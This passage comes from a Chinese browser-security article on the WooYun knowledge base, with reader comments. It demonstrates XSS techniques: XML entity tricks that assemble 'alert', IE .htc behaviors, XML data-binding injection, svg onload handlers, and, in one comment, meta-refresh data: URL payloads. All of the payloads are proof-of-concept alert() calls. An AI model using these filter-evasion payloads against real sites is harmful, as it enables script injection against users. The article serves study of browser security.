+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;script&gt;&amp;x;(document.domain);&lt;/script&gt;
+&lt;/html&gt;
+</code></pre><p>上面代码定义了一个&amp;y变量为"ert"，&amp;x为"al&amp;y"（a与&amp;符号编码了一下），即alert，</p><pre><code>&lt;!DOCTYPE xss [&lt;!ENTITY _k "&amp;#x61;l&amp;#x26;__;"&gt;&lt;!ENTITY __ "ert" &gt; ]&gt;
+&lt;script xmlns="http://www.w3.org/1999/xhtml"&gt;
+&amp;lt;!--&amp;#10;&amp;_k;(1&amp;#x000029;
+&lt;/script&gt;
+</code></pre><p>在xml中，包括script标签内的代码浏览器都会entity解码后执行，这点很有用：</p><pre><code>&lt;script xmlns="http://www.w3.org/1999/xhtml"&gt;
+a='&amp;#x27;,alert(1)//';
+b='&amp;#39;,alert(2)//';
+c='&amp;apos;,alert(3)//';
+&lt;/script&gt;
+</code></pre><p>从5.5版本开始，Internet Explorer（IE）开始支持Web 行为的概念。</p><p>这些行为是由后缀名为.htc的脚本文件描述的，它们定义了一套方法和属性，几乎可以把这些方法和属性应用到HTML页面上的任何元素上去。</p><p>HTML中可以通过加载CSS的behavior的方式调用htc文件，仅支持同域调用：</p><pre><code>//HTML文件代码：
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;body { behavior: url(test.htc);}&lt;/style&gt; &lt;/head&gt;
+&lt;body&gt;Hello&lt;/body&gt;
+&lt;/html&gt;
+//htc文件代码：
+&lt;PUBLIC:COMPONENT&gt;
+&lt;PUBLIC:ATTACH EVENT="onclick" ONEVENT="alert(1)" /&gt;
+&lt;/PUBLIC:COMPONENT&gt;
+</code></pre><p>同样HTML调用XML文件执行javascript：</p><pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;xml id="xss" src="test.xml"&gt;&lt;/xml&gt;
+&lt;label dataformatas=html datasrc=#xss datafld=payload&gt;&lt;/label&gt; &lt;/body&gt;
+&lt;/html&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;x&gt;
+&lt;payload&gt;
+&lt;![CDATA[&lt;img src=x onerror=alert(domain)&gt;]]&gt; &lt;/payload&gt;
+&lt;/x&gt;
+</code></pre><p>dataformatas定义了获取到的数据以什么格式解析（HTML或text），datasrc指绑定的id，datafld指使用哪一段数据。</p><p>svg调用javascript（新版本的几个浏览器支持）：</p><pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;g onload="alert(1)"&gt;&lt;/g&gt;
+&lt;/svg&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(2)"&gt;&lt;/svg&gt;
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/150" rel="bookmark" id="re1">Browser Security-css、javascript</a></li><li><a href="http://drops.wooyun.org/tips/151" rel="bookmark" id="re2">Browser Security-同源策略、伪URL的域</a></li><li><a href="http://drops.wooyun.org/tips/845" rel="bookmark" id="re3">Bypass xss过滤的测试方法</a></li><li><a href="http://drops.wooyun.org/papers/894" rel="bookmark" id="re4">XSS挑战第一期Writeup</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">marshal</span> <span class="reply-time">2015-06-12 17:54:22</span></div><p></p><p>谢谢，好文章，必须学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">todaro</span> <span class="reply-time">2014-12-31 19:38:34</span></div><p></p><p>好难</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Barret Lee</span> <span class="reply-time">2014-04-30 22:24:32</span></div><p></p><p>太深入了- -</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-21 00:03:41</span></div><p></p><p>小伙伴，麻烦把评论发一份到我邮箱吧，我去更新。邮箱地址见右上角！~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xser233</span> <span class="reply-time">2014-03-20 23:42:45</span></div><p></p><p>好吧...关键词都被屏蔽掉了...谁看得懂我在说毛线啊...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xser233</span> <span class="reply-time">2014-03-20 23:40:30</span></div><p></p><p>@瞌睡龙</p><p>CHROME	最新版	33.0.1750.146 m<br>FIREFOX 最新版	28.0<br>OPERA 最新版	20.0.1387.82<br>都支持	&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; url=data:text/html,&lt;script&gt;alert(2)&lt;/script&gt;&quot;&gt;<br>都不支持	&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; url=javascript:alert(1)&quot;&gt;</p><p>IE7 我这里只有IE7 对以上两种都不支持..</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-17 00:06:51</span></div><p></p><p>这是如何做到的 太惊人了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">D＆G</span> <span class="reply-time">2013-12-16 21:30:46</span></div><p></p><p>这是如何做到的，太惊人了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">abcdlzy</span> <span class="reply-time">2013-06-21 09:42:14</span></div><p></p><p>很详细，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nicky</span> <span class="reply-time">2013-06-19 21:58:28</span></div><p></p><p>..看着头好晕</p><p></p></div></div></div></div></div></main>
